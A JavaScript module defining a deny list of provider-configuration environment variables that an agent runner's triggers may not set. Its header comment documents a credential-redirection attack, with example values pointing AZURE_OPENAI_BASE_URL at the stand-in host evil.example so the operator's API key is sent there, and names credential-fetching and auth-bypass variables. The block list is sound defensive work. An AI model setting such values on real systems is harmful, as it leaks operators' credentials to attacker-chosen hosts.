/**
 * The environment variables pi and its provider SDKs read to CONFIGURE a provider, as opposed to the ones
 * pi reads the provider's KEY from (issue #314).
 *
 * WHY THIS IS A REFUSAL AND NOT A CURIOSITY. `run.secrets` lets a trigger name an environment variable,
 * and the existing gates refuse the names the worker writes and the ones pi reads the resolved provider's
 * key from. They refuse none of these, and these are worse than the substitution they do refuse:
 * substitution spends the trigger author's money, redirection sends the OPERATOR'S credential to a host
 * the trigger chose.
 *
 * Measured against the 0.80.7 pin with a stubbed fetch and no real key:
 *   AZURE_OPENAI_BASE_URL=https://evil.example/openai/v1
 *     -> https://evil.example/openai/v1/responses?api-version=v1, carrying `api-key`
 *   AZURE_OPENAI_RESOURCE_NAME=evilcorp
 *     -> https://evilcorp.openai.azure.com/openai/v1/responses?api-version=v1, carrying `api-key`
 *
 * `getProviderEnvValue` is `env?.[name] || process.env[name]`, so the real environment is read; and every
 * azure model ships `baseUrl: ""`, which is falsy, so there the environment is not a shadowed default but
 * the PRIMARY source, ahead of the resource name and ahead of the model.
 *
 * THE ANTHROPIC PAIR THE ISSUE WAS FILED ABOUT IS INERT ONLY CONDITIONALLY, which is why it is in this
 * set rather than left to the pin alone. pi passes `baseURL: model.baseUrl` and an explicit `authToken`
 * on every branch, so the SDK's own `readEnv` defaults never fire -- while `model.baseUrl` is a non-empty
 * string. Every BUILTIN anthropic model carries one. A model declared in the operator's global overlay
 * (`/opt/pi-global/models.json`, which the runner prefers) need not, and with `baseUrl` undefined the
 * request goes wherever `ANTHROPIC_BASE_URL` says. Measured both ways;
 * `worker/test/env-allowlist.test.mjs` pins the inert case and its control.
 *
 * DERIVED FROM TWO SOURCES, NEVER CURATED. A hand-written table that restates a derivable source is
 * either derived or pinned, and this one is pinned in BOTH directions by
 * `worker/test/provider-steering.test.mjs`, which extracts the names from the pinned artifacts themselves:
 *
 *   1. every `getProviderEnvValue("NAME")` in `@earendil-works/pi-ai`'s `dist` -- pi's own provider config;
 *   2. every `readEnv("NAME")` in the provider SDKs pi constructs clients from (`@anthropic-ai/sdk` and
 *      `openai`) -- the defaults that fire when pi passes nothing.
 *
 * That is what makes a pi bump adding a steering variable a red build rather than a silent hole, and it is
 * why the set contains names nobody would have thought to write down. The sharpest members are not the
 * base URLs at all: `AWS_CONTAINER_CREDENTIALS_FULL_URI` makes the AWS SDK fetch credentials from a URL of
 * the trigger's choosing, `AWS_WEB_IDENTITY_TOKEN_FILE` and `GOOGLE_APPLICATION_CREDENTIALS` are paths to
 * credential files, and `AWS_BEDROCK_SKIP_AUTH` is an auth bypass. A curated list would have had the azure
 * base URL and stopped.
 *
 * THE KEY VARIABLES ARE LEFT IN rather than subtracted, even though the pre-spend gate already covers most
 * of them. Subtracting would couple this set to `providerKeyCandidates` and make the bolt compare a
 * difference instead of an extraction, and the overlap is free in a Set. It also closes a real gap on its
 * own: `providerKeyCandidates("amazon-bedrock")` is `undefined`, so before this the pre-spend gate reserved
 * NOTHING for a bedrock deployment and a trigger could bind `AWS_SECRET_ACCESS_KEY` outright.
 *
 * THE BENIGN MEMBERS ARE LEFT IN for the same reason. `AWS_REGION`, `OPENAI_LOG` and `PI_CACHE_RETENTION`
 * steer nothing dangerous, and dropping them would make the set a judgement again instead of a derivation.
 * A trigger has no business setting any of them, and an operator who genuinely needs one uses
 * `PI_FORWARD_ENV`, which is deployment state and is exactly the seam that distinction exists for.
 *
 * IMPORT-FREE, like `reserved-env.mjs` and `provider-key.mjs` beside it: `triggers.mjs` is the shared
 * validator, the receiver loads it, and `admin/build.mjs` inlines it into the published console.
 */
export const PROVIDER_STEERING_VARS = new Set([
	"ANTHROPIC_API_KEY",
	"ANTHROPIC_AUTH_TOKEN",
	"ANTHROPIC_BASE_URL",
	"ANTHROPIC_LOG",
	"AWS_ACCESS_KEY_ID",
	"AWS_BEARER_TOKEN_BEDROCK",
	"AWS_BEDROCK_FORCE_CACHE",
	"AWS_BEDROCK_FORCE_HTTP1",
	"AWS_BEDROCK_SKIP_AUTH",
	"AWS_CONTAINER_CREDENTIALS_FULL_URI",
	"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
	"AWS_DEFAULT_REGION",
	"AWS_PROFILE",
	"AWS_REGION",
	"AWS_SECRET_ACCESS_KEY",
	"AWS_SESSION_TOKEN",
	"AWS_WEB_IDENTITY_TOKEN_FILE",
	"AZURE_OPENAI_API_KEY",
	"AZURE_OPENAI_API_VERSION",
	"AZURE_OPENAI_BASE_URL",
	"AZURE_OPENAI_DEPLOYMENT_NAME_MAP",
	"AZURE_OPENAI_RESOURCE_NAME",
	"GCLOUD_PROJECT",
	"GOOGLE_APPLICATION_CREDENTIALS",
	"GOOGLE_CLOUD_LOCATION",
	"GOOGLE_CLOUD_PROJECT",
	"OPENAI_API_KEY",
	"OPENAI_API_VERSION",
	"OPENAI_BASE_URL",
	"OPENAI_LOG",
	"OPENAI_ORG_ID",
	"OPENAI_PROJECT_ID",
	"OPENAI_WEBHOOK_SECRET",
	"PI_CACHE_RETENTION",
	"PI_GATEWAY",
	"PI_OAUTH_CALLBACK_HOST",
]);
